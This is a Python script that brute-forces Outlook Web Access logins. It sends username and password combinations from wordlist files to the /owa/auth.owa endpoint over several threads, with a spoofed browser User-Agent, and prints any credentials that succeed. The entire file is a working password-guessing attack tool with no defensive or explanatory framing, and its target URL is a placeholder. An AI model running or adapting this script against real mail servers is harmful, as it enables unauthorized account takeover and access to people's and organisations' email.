import re
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List

def read_password_file(file_name: str) -> List[str]:
    with open(file_name, 'r') as file:
        return [line.strip() for line in file]

def check_success(response_text: str) -> bool:
    # Başarılı oturum açma işleminde bulunması muhtemel anahtar kelimeler
    success_keywords = ["Inbox", "Sign Out", "Sign out", "New Message", "Mailbox"]

    for keyword in success_keywords:
        if keyword in response_text:
            return True

    return False

def brute_force(url: str, username: str, password: str, verbose: bool = False) -> bool:
    post_data = f"password={password}&isUtf8=1&passwordText=&trusted=4&destination={url}&flags=4&forcedownlevel=0&username={username}"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
    }

    with requests.Session() as session:
        login_url = f"{url}/owa/auth.owa"
        response = session.post(login_url, data=post_data, headers=headers)

        if verbose:
            print(f"Trying: {username}, password: {password}")

        if "The user name or password you entered isnt correct" in response.text:
            return False
        elif response.status_code == 200 and check_success(response.text):
            return True

    return False

def read_usernames_file(file_name: str) -> List[str]:
    with open(file_name, 'r') as file:
        return [line.strip() for line in file]

def main():
    target_url = "https:/xxxxx"
    usernames_file = "usernames.txt"
    usernames = read_usernames_file(usernames_file)
    password_file = "wordlist.txt"
    passwords = read_password_file(password_file)
    thread_number = 3
    verbose_mode = True

    for username in usernames:
        with ThreadPoolExecutor(max_workers=thread_number) as executor:
            futures = {executor.submit(brute_force, target_url, username, password, verbose_mode): password for password in passwords}

            for future in as_completed(futures):
                password = futures[future]
                success = future.result()

                if success:
                    print(f"username {username} password: {password}")
                    break
                else:
                    if verbose_mode:
                        pass
if __name__ == "__main__":
    main()
